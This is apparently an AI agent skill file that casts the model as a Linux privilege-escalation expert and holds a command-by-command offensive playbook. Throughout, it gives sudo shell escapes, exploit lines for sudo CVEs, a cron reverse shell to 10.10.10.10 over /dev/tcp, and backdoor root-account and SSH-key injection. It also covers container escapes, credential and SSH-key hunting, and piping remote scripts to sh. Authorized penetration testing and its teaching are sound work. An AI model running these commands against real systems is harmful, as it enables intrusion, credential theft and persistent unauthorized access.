---
name: escalating-linux-privileges
description: Escalate privileges on Linux systems using SUID/SGID binaries, capabilities, sudo misconfigurations, cron jobs, kernel exploits, and container escapes. Use when performing Linux post-exploitation or privilege escalation.
---

# Linux Privilege Escalation Skill

You are a Linux security expert specializing in privilege escalation techniques. Use this skill when the user requests help with:

- Escalating privileges on Linux systems
- Identifying misconfigurations and vulnerabilities
- Exploiting SUID/SGID binaries
- Abusing Linux capabilities
- Kernel exploitation
- Container escape techniques
- Sudo misconfigurations and bypasses
- Cron job exploitation
- Path hijacking attacks

## When to Use

Activate this skill when the user asks to:
- Escalate privileges on a Linux system
- Enumerate Linux privilege escalation vectors
- Exploit SUID binaries or capabilities
- Abuse sudo misconfigurations
- Escape from containers
- Identify kernel exploits
- Find and exploit cron job weaknesses
- Analyze Linux security misconfigurations

## When NOT to Use

- **Windows hosts** — use `escalating-windows-privileges`
- **Container escapes** — use `exploiting-containers`
- **Keeping the access you gained** — use `establishing-persistence`
- **Analyzing a compromised host as a defender** — use `responding-to-incidents`

## Core Methodologies

### 1. Initial System Enumeration

**System Information:**
```bash
# OS and kernel version
cat /proc/version
uname -a
lsb_release -a
cat /etc/os-release

# Check for kernel exploits
searchsploit "Linux Kernel $(uname -r)"
uname -r

# CPU and system stats
lscpu
cat /proc/cpuinfo
df -h
```

**Current User Context:**
```bash
# Who am I?
id
whoami
groups
sudo -l

# Environment variables (passwords, API keys?)
env
set
cat /proc/self/environ | tr '\0' '\n'

# Check PATH for hijacking opportunities
echo $PATH
```

**Users and Groups:**
```bash
# All users
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1

# Users with bash
cat /etc/passwd | grep "/bin/bash"

# User details
cat /etc/shadow  # If readable
cat /etc/group

# Home directories
ls -la /home/
```

### 2. Sudo Exploitation

**Check Sudo Permissions:**
```bash
# What can I run as root?
sudo -l

# Check sudo version for known vulns
sudo -V
sudo --version
```

**Common Sudo Misconfigurations:**
```bash
# NOPASSWD entries
sudo -l | grep NOPASSWD

# Wildcards exploitation
# If: (root) NOPASSWD: /bin/cp /tmp/* /var/www/html/
# Then: Create malicious file in /tmp, overwrite system files

# Shell escapes from sudo
# If you can run vim, less, more, man, etc. with sudo:
sudo vim -c ':!/bin/bash'
sudo less /etc/profile  # then !/bin/bash
sudo awk 'BEGIN {system("/bin/bash")}'
sudo find . -exec /bin/bash \; -quit
sudo nmap --interactive  # then !bash
```

**Sudo CVEs:**
```bash
# CVE-2021-3156 (Baron Samedit) - Sudo < 1.9.5p2
sudoedit -s /
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# CVE-2019-14287 - Sudo < 1.8.28
# If: (ALL, !root) /bin/bash
sudo -u#-1 /bin/bash

# CVE-2019-18634 - Sudo < 1.8.26, pwfeedback enabled in /etc/sudoers
# Exploitable if pwfeedback is enabled in /etc/sudoers
```

**GTFOBins for Sudo:**
```bash
# Check https://gtfobins.github.io/ for specific binary
# Examples:
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo git -p help  # then !/bin/bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 3. SUID/SGID Binaries and Linux Capabilities

SUID/SGID binaries and file capabilities are the two most common local
privesc vectors. Enumerate every one, then check GTFOBins for each, and
prefer `-p` shells so privileges are not dropped. The exhaustive `find`
enumeration, GTFOBins one-liners, and per-capability abuse catalog live
in `references/suid-sgid-and-capabilities.md`.

### 4. Cron Jobs Exploitation

**Enumerate Cron Jobs:**
```bash
# System-wide cron
cat /etc/crontab
ls -la /etc/cron.*
ls -la /etc/cron.d/
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/

# User crontabs
crontab -l
crontab -l -u username

# Check for running cron
ps aux | grep cron
systemctl status cron
```

**Exploiting Writable Cron Scripts:**
```bash
# If a cron script is writable
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/cron/script.sh
# Wait for cron to execute
/tmp/rootbash -p

# Reverse shell payload
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /path/to/cron/script.sh
```

**PATH Exploitation in Cron:**
```bash
# If cron uses relative paths without full path
# Example: /etc/crontab contains: * * * * * root backup.sh
# Create malicious backup.sh in /tmp/ and modify PATH
echo '/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"' > /tmp/backup.sh
chmod +x /tmp/backup.sh
```

**Wildcards in Cron:**
```bash
# If cron job has: tar czf /backup/backup.tar.gz *
# Create malicious files
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > exploit.sh
chmod +x exploit.sh
touch -- --checkpoint=1
touch -- --checkpoint-action=exec=exploit.sh
# When tar runs with wildcard, it executes exploit.sh
```

### 5. Writable Files and Directories

**Find Writable Files:**
```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v "/proc/"
find / -perm -2 -type f 2>/dev/null

# Files owned by current user
find / -user $(whoami) 2>/dev/null
find / -group $(groups | cut -d' ' -f1) 2>/dev/null

# Writable /etc/ files (critical)
find /etc -writable -type f 2>/dev/null
```

**Critical Writable Files:**
```bash
# /etc/passwd - add root user
echo 'newroot::0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot

# /etc/shadow - overwrite root hash
# Generate hash: openssl passwd -6 password
# Replace root line

# /etc/sudoers - add sudo permission
echo 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

# /etc/crontab - add malicious cron
echo '* * * * * root /tmp/exploit.sh' >> /etc/crontab

# ~/.ssh/authorized_keys - add SSH key
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
```

### 6. Container Escape

**Detect if in Container:**
```bash
# Check for .dockerenv
ls -la /.dockerenv

# Check cgroup
cat /proc/1/cgroup | grep docker
cat /proc/self/cgroup

# Check for container-specific files
ls -la /.containerenv  # Podman
cat /proc/1/environ | grep container
```

**Container Escape Techniques:**
```bash
# Privileged container with access to /dev
# Mount host filesystem
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Docker socket mounted (/var/run/docker.sock)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Cap_sys_admin capability
# Can mount host filesystem or abuse other admin functions

# containerd/runc escape (CVE-2019-5736)
# Overwrite runc binary on host

# Kubernetes pod escape
# Service account tokens: /run/secrets/kubernetes.io/serviceaccount/
kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) get pods
```

### 7. Password Hunting

**Search for Passwords:**
```bash
# Grep for password strings
grep -r "password" /home/ 2>/dev/null
grep -r "passwd" /var/www/ 2>/dev/null
grep -ir "pwd\|pass" /opt/ 2>/dev/null

# Configuration files
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.ssh/id_rsa

# Database files
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null

# Check environment
env | grep -i pass

# Check for credentials in scripts
find / -name "*.sh" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.py" -exec grep -l "password" {} \; 2>/dev/null

# Memory dumps
strings /dev/mem
strings /proc/kcore

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

### 8. Kernel Exploits and NFS

Last-resort paths, kept out of line because they are rarely the right answer
and are unstable when they are. See `references/kernel-and-nfs.md` for
kernel exploit selection and `no_root_squash` NFS abuse.

## Automated Enumeration Tools

**LinPEAS (Recommended):**
```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or locally
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**LinEnum:**
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

**Linux Smart Enumeration (LSE):**
```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
chmod +x lse.sh
./lse.sh -l1  # Level 1 (fast)
./lse.sh -l2  # Level 2 (thorough)
```

**pspy (Monitor Processes):**
```bash
# Monitor for cron jobs and processes without root
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

## Troubleshooting

**Exploit Not Working:**
- Check architecture: `uname -m` (x86_64, i686, arm, etc.)
- Compile on target system if possible
- Check kernel version exactly matches exploit requirements
- Verify exploit is for correct Linux distribution
- Check for security mitigations (AppArmor, SELinux, ASLR)

**SUID Binary Not Spawning Root Shell:**
- Use `-p` flag to preserve privileges: `/bin/bash -p`
- Some shells drop privileges; try different shells
- Check if binary has capabilities instead of SUID

**Cannot Compile Exploit:**
- Transfer pre-compiled binary
- Cross-compile on attacker machine
- Use statically compiled binaries
- Check for gcc, g++, make on target

**Permission Denied Errors:**
- Check file permissions carefully
- Verify you're in correct group
- Check AppArmor/SELinux is not blocking
- Try different attack vector

## References

- [references/suid-sgid-and-capabilities.md](references/suid-sgid-and-capabilities.md) — SUID/SGID and capabilities enumeration/exploitation catalog (progressive disclosure)
- [references/kernel-and-nfs.md](references/kernel-and-nfs.md) — Kernel exploit selection and `no_root_squash` NFS abuse (progressive disclosure)
- HackTricks Linux Privesc: https://github.com/HackTricks-wiki/hacktricks/tree/master/src/linux-hardening/privilege-escalation
- GTFOBins: https://gtfobins.github.io/
- PEASS-ng (LinPEAS): https://github.com/carlospolop/PEASS-ng
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- Linux Privilege Escalation Techniques: https://book.hacktricks.xyz/linux-hardening/privilege-escalation

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills-core/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Execution** (TA0002)

- [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell

**Persistence** (TA0003)

- [T1053.003](https://attack.mitre.org/techniques/T1053/003/) Cron — see also `establishing-persistence`
- [T1543.002](https://attack.mitre.org/techniques/T1543/002/) Systemd Service — see also `establishing-persistence`

**Privilege Escalation** (TA0004)

- [T1068](https://attack.mitre.org/techniques/T1068/) Exploitation for Privilege Escalation — see also `escalating-windows-privileges`
- [T1548](https://attack.mitre.org/techniques/T1548/) Abuse Elevation Control Mechanism _(also Defense Evasion)_ — see also `escalating-windows-privileges`
- [T1548.001](https://attack.mitre.org/techniques/T1548/001/) Setuid and Setgid
- [T1548.003](https://attack.mitre.org/techniques/T1548/003/) Sudo and Sudo Caching

**Credential Access** (TA0006)

- [T1003.008](https://attack.mitre.org/techniques/T1003/008/) /etc/passwd and /etc/shadow — see also `cracking-passwords`
- [T1552](https://attack.mitre.org/techniques/T1552/) Unsecured Credentials — see also `exploiting-cloud-platforms`, `auditing-supply-chain`, `abusing-ci-cd-oidc`

**Discovery** (TA0007)

- [T1082](https://attack.mitre.org/techniques/T1082/) System Information Discovery — see also `escalating-windows-privileges`
- [T1083](https://attack.mitre.org/techniques/T1083/) File and Directory Discovery — see also `escalating-windows-privileges`

**Lateral Movement** (TA0008)

- [T1021.004](https://attack.mitre.org/techniques/T1021/004/) SSH — see also `enumerating-network-services`

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->
